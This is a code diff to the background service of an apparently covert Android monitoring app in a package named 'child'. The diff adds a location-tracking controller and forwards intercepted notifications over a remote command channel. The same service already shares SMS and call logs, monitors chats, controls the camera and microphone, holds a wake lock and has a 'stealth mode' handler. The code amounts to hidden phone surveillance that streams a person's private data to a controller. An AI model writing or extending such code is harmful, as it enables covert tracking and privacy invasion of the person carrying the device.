@@ -18,7 +18,6 @@ import androidx.core.content.edit
 import androidx.core.net.toUri
 import com.google.firebase.database.FirebaseDatabase
 import com.soumo.child.commands.BackgroundServiceExtendedStealthHandler
-import com.soumo.child.commands.BackgroundServiceLocationHandler
 import com.soumo.child.commands.BackgroundServicePermissionHandler
 import com.soumo.child.commands.BackgroundServiceSettingsHandler
 import com.soumo.child.commands.CommandHandler
@@ -27,7 +26,9 @@ import com.soumo.child.components.calllog.CallLogSharing
 import com.soumo.child.components.camera.CameraController
 import com.soumo.child.components.chat.ChatMonitor
 import com.soumo.child.components.chat.DataChannelClient
+import com.soumo.child.components.location.LocationController
 import com.soumo.child.components.microphone.MicrophoneController
+import com.soumo.child.components.notification.NotificationListener
 import com.soumo.child.components.sms.SmsSharing
 import com.soumo.child.configuration.AppConfig
 import com.soumo.child.id.DeviceIdManager
@@ -93,6 +94,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
     private var smsSharing: SmsSharing? = null // Manages SMS sharing
     private var callLogSharing: CallLogSharing? = null // Manages Call Log sharing
     private var dataChannel: DataChannel? = null // DataChannel for commands
+    private var locationController: LocationController? = null // Manages location sharing
 
     // Connection Management
     private var healthCheckJob: Job? = null // Job for health checks
@@ -139,24 +141,24 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                 return@launch // Already generated
             }
             try { // Generate unique device ID
-                Log.d("BackgroundService", "🪪 Starting device ID generation...")
+                Log.d("BackgroundService", "🪪 Starting device ID generation")
                 val deviceId = DeviceIdManager.generateUniqueDeviceId(applicationContext) // May take time
                 childId = DeviceIdManager.format(deviceId) // Format for display
-                // Save to SharedPreferences for access by other components
+                // Save to SharedPreferences for access by other components (e.g. MainActivity) too
                 val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE) // Consistent prefs name
-                prefs.edit { putString("device_id", deviceId) } // Save raw ID
+                prefs.edit { putString("device_id", deviceId) } // Save raw ID only
                 Log.d("BackgroundService", "👍 Device ID generated and saved: $deviceId") // Log raw ID
                 Log.i("BackgroundService", "👍 Device ID ready: $childId") // Log formatted ID
-            } catch (e: Exception) { // Handle errors
+            } catch (e: Exception) { // Handle errors gracefully
                 Log.e("BackgroundService", "❌ Failed to generate device ID", e) // Log error
             }
         }
-        /** Note: Job scheduling should only happen in BootReceiver and PersistentJobService, to avoid infinite loops */
+        /* Note: Job scheduling should only happen in BootReceiver and PersistentJobService, to avoid infinite loops */
     }
 
-    private var wakeLock: PowerManager.WakeLock? = null // Wake lock reference
+    private var wakeLock: PowerManager.WakeLock? = null // Wake lock reference for CPU keep-alive operations
 
-    private fun acquireWakeLock() { // Acquire wake lock
+    private fun acquireWakeLock() { // Acquire wake lock to keep CPU on
         try { // Acquire partial wake lock
             val powerManager = getSystemService(POWER_SERVICE) as PowerManager // Get PowerManager
             wakeLock = powerManager.newWakeLock( // Create wake lock
@@ -435,6 +437,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                 dataChannel?.let { channel -> // Ensure channel is not null
                     smsSharing = SmsSharing(this, channel) // Initialize SMS sharing
                     callLogSharing = CallLogSharing(this, channel) // Initialize Call Log sharing
+                    locationController = LocationController(this, channel) // Initialize Location controller
 
                     // 🔗 Wire DataChannelClient for ChatMonitor here
                     ChatMonitor.Companion.instance.setDataChannelClient(object : DataChannelClient { // Set DataChannelClient
@@ -454,6 +457,8 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                             }
                         }
                     })
+                    // 🔗 Wire DataChannel to NotificationListener here
+                    NotificationListener.attachDataChannel(channel)
                 }
 
                 // Initialize CommandHandler now that DataChannel is ready
@@ -470,10 +475,10 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                     stealthHandler = BackgroundServiceExtendedStealthHandler( // Stealth mode handler
                         stealthActivated, // AtomicBoolean to track state
                         onActivate = { this@BackgroundService.activateStealthModeService() }, // Activate callback
-                        onDeactivate = { this@BackgroundService.deactivateStealthModeService() }, // Deactivate callback
-                        updateLastPongAtMs = { lastPongAtMs = it } // Update last pong timestamp
+                        onDeactivate = { this@BackgroundService.deactivateStealthModeService() } // Deactivate callback
+                        // Update last pong timestamp
                     ),
-                    locationHandler = BackgroundServiceLocationHandler(), // Location handler
+                    locationHandler = locationController, // Location handler wired to controller
                     settingsHandler = BackgroundServiceSettingsHandler(this) { msg -> // Settings handler with callback
                         // Callback to send messages back via DataChannel
                         sendDataChannelMessage( // Send message callback
@@ -498,7 +503,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
                                     serviceScope.launch { // Restart connection
                                         restartConnection() // Restart connection
                                     }
-                                 }
+                                }
                             }
                             else -> {
                                 Log.d("BackgroundService", "DataChannel state: $state")
@@ -531,7 +536,7 @@ class BackgroundService : Service() { // No binding, so return null in onBind
         } catch (e: Exception) { // Handle errors
             Log.e("BackgroundService", "Error initializing connection", e)
             delay(5000) // Wait before retrying to avoid rapid loops
-                initializeConnection() // Retry initialization
+            initializeConnection() // Retry initialization
         }
     }
 
@@ -602,6 +607,8 @@ class BackgroundService : Service() { // No binding, so return null in onBind
             callLogSharing?.stopSharing() // Stop Call Log sharing
             callLogSharing = null // Clear reference
             Log.d("BackgroundService", "Connection cleanup completed")
+            locationController?.stopLocationTracking() // Stop location tracking
+            locationController = null // Clear reference
         } catch (e: Exception) { // Handle errors
             Log.e("BackgroundService", "Error during cleanup", e)
         }
